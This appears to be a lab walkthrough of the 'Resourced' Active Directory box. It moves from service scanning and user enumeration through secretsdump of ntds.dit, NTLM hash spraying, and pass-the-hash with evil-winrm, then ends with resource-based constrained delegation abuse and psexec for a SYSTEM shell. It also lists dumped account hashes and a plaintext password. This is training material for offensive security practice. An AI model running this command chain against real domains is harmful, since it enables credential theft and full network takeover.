Level: intermediate

service scanning
```
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 125 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 125 Microsoft Windows Kerberos (server time: 2025-12-17 08:22:02Z)
135/tcp   open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 125 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 125 Microsoft Windows Active Directory LDAP (Domain: resourced.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 125
464/tcp   open  kpasswd5?     syn-ack ttl 125
593/tcp   open  ncacn_http    syn-ack ttl 125 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 125
3268/tcp  open  ldap          syn-ack ttl 125 Microsoft Windows Active Directory LDAP (Domain: resourced.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 125
3389/tcp  open  ms-wbt-server syn-ack ttl 125 Microsoft Terminal Services
| ssl-cert: Subject: commonName=ResourceDC.resourced.local
| Issuer: commonName=ResourceDC.resourced.local
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-12-16T08:16:53
| Not valid after:  2026-06-17T08:16:53
| MD5:   96b7:5d97:56ad:dcc0:fd0c:1e40:fd7e:2554
| SHA-1: 8c96:0d7f:23d0:c41b:72ca:2cb4:6e45:6a48:f85f:c90b
| -----BEGIN CERTIFICATE-----
| MIIC+DCCAeCgAwIBAgIQHH9Wx7CImLpGAjbt1xF+QDANBgkqhkiG9w0BAQsFADAl
| MSMwIQYDVQQDExpSZXNvdXJjZURDLnJlc291cmNlZC5sb2NhbDAeFw0yNTEyMTYw
| ODE2NTNaFw0yNjA2MTcwODE2NTNaMCUxIzAhBgNVBAMTGlJlc291cmNlREMucmVz
| b3VyY2VkLmxvY2FsMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAyfC1
| tyS2cngtn0gSEc8/Brl3ezWd1xBMqafvmEWXhzpEotqC7QYLmaWdF3KvTNiswcQq
| 8Qyo9vf7g4bvuR6VGJPoI4R/0PPm1xHImO3RZr5oyUhnjWZpCLXE8QqS8NwHsv2D
| HChkqs4xMbW2y8/SlFUZDDxxrOsE9TvWNey43mCNxv6zByC0RmB60YZq4VUYx6aQ
| GWBNyf0u8G+Es8sSYP6FoqMZC7MCahbyG+WlzAMePeDCxfTTWZgw3Jv93I8FWLcX
| 57hPk0nIYuH0eQg3CKGu+RwuvBS2uYo6OdG+C4j0tBgVXeozT3wr0dh/n/LfdhxH
| rjzY7y07CQR7kHDmyQIDAQABoyQwIjATBgNVHSUEDDAKBggrBgEFBQcDATALBgNV
| HQ8EBAMCBDAwDQYJKoZIhvcNAQELBQADggEBAC2ntfwkYQuHNwu7aC/MoQekVa69
| WecNPCmzflvifi6bDuK45a7eGpjOrJfypc/DOWSvDqzz+arlG5fEYy7KiyQrvEOf
| xxLazEakcB1bunrIz2WVBVcESn+gnGYiRKeXIceUXiWNU/ZajUNbfbVsMblEg9Ci
| Cvgq6BXezJxyj4VpbAH8J94G4xrRUGYgW+9HD9yEbNrKUeesR27F94F0+66jYTnL
| QTKBgVf24TuSQM4QtXWw8/LWMiRbporyghss8SDmQhiwR8rNkMYoDlNUw/+kZ0iy
| QNW/w7l8KI1ArqqgEghiv1h1Z9gKpOcHTyvlLlJkRGphVdnMfblfLRg8VvI=
|_-----END CERTIFICATE-----
|_ssl-date: 2025-12-17T08:23:30+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: resourced
|   NetBIOS_Domain_Name: resourced
|   NetBIOS_Computer_Name: RESOURCEDC
|   DNS_Domain_Name: resourced.local
|   DNS_Computer_Name: ResourceDC.resourced.local
|   DNS_Tree_Name: resourced.local
|   Product_Version: 10.0.17763
|_  System_Time: 2025-12-17T08:22:50+00:00
5985/tcp  open  http          syn-ack ttl 125 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 125 .NET Message Framing
49666/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49674/tcp open  ncacn_http    syn-ack ttl 125 Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49693/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49708/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
Service Info: Host: RESOURCEDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 0s, deviation: 0s, median: 0s
| smb2-time: 
|   date: 2025-12-17T08:22:51
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 30738/tcp): CLEAN (Timeout)
|   Check 2 (port 8731/tcp): CLEAN (Timeout)
|   Check 3 (port 58396/udp): CLEAN (Timeout)
|   Check 4 (port 38213/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

```


![](../../Assets/Screenshot%202025-12-17%20at%204.24.28%20PM.png)
domain name -> resourced.local

```
enum4linux 192.168.240.175 | egrep "Account|Domain|Lockout|Group"
```


![](../../Assets/Screenshot%202025-12-17%20at%204.31.37%20PM.png)
We get the Account V.Ventz with the password of HotelCalifornia194!


Open up bloodhound
```
bloodhound-python -u 'V.Ventz' -p 'HotelCalifornia194!' -ns 192.168.240.175 -d resourced.local -c all
```

```
bloodhound
```


Interesting share: Password Audit
![](../../Assets/Screenshot%202025-12-17%20at%204.43.48%20PM.png)


mount the share
```
sudo mkdir -p /mnt/tmp
sudo mount -t cifs -o username='V.Ventz',password=HotelCalifornia194!,domain=. //192.168.220.129/"Password Audit" /mnt/tmp
```

copy the files over
```
impacket-secretsdump -ntds ntds.dit -system SYSTEM -security SECURITY LOCAL
```

```
Administrator
Guest
RESOURCEDC$
krbtgt
M.Mason
K.Keen
L.Livingstone
J.Johnson
V.Ventz
S.Swanson
P.Parker
R.Robinson
D.Durant
G.Goldberg
```

hashes
```
12579b1666d4ac10f0f59f300776495f
31d6cfe0d16ae931b73c59d7e0c089c0
9ddb6f4d9d01fedeb4bccfb09df1b39d
3004b16f88664fbebfcb9ed272b0565b
3105e0f6af52aba8e11d19f27e487e45
204410cc5a7147cd52a04ddae6754b0c
19a3a7550ce8c505c2d46b5e39d6f808
3e028552b946cc4f282b72879f63b726
913c144caea1c0a936fd1ccb46929d3c
bd7c11a9021d2708eda561984f3c8939
980910b8fc2e4fe9d482123301dd19fe
fea5a148c14cf51590456b2102b29fac
08aca8ed17a9eec9fac4acdcb4652c35
62e16d17c3015c47b4d513e65ca757a2
```



![](../../Assets/Screenshot%202025-12-17%20at%205.27.07%20PM.png)


hashes spraying
```
crackmapexec winrm 192.168.240.175 -u names.txt -H hashes.txt
```

![](../../Assets/Screenshot%202025-12-17%20at%205.32.41%20PM.png)

```
resourced.local\L.Livingstone:19a3a7550ce8c505c2d46b5e39d6f808
```

login as L.Livingstone
```
evil-winrm -i 192.168.178.175 -u "L.Livingstone" -H "19a3a7550ce8c505c2d46b5e39d6f808"
```

Path finding from the bloodhound previously
![](../../Assets/Screenshot%202025-12-18%20at%2011.56.02%20AM.png)


Click on Generic All -> Linux Abuse
![](../../Assets/Screenshot%202025-12-18%20at%2011.57.05%20AM.png)


we don't have the password of L.Livingstone so we got to use the hash

```
impacket-addcomputer -computer-name 'EVIL$' -computer-pass '3V1lp@ss!' -dc-ip 192.168.178.175 -hashes :19a3a7550ce8c505c2d46b5e39d6f808 'resourced.local/L.Livingstone'
```

```
impacket-rbcd -delegate-from 'EVIL$' -delegate-to 'resourcedc$' -action 'write' 'resourced.local/L.Livingstone' -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -dc-ip 192.168.178.175
```

```
impacket-getST -spn 'cifs/resourcedc.resourced.local' -impersonate 'Administrator' -dc-ip 192.168.178.175 'resourced.local/EVIL$:3V1lp@ss!' 
```
This ticket can then be used with Pass-the-Ticket, and could grant access to the file system of the resourcedc$.

```
export KRB5CCNAME=/home/hnin/Desktop/Administrator.ccache
```

Use impacket-psexec to pass the ticket and get the shell
```
impacket-psexec resourced.local/Administrator@resourcedc.resourced.local -k -no-pass -target-ip 192.168.178.175
```

![](../../Assets/Screenshot%202025-12-18%20at%2012.34.53%20PM.png)

we get the system shell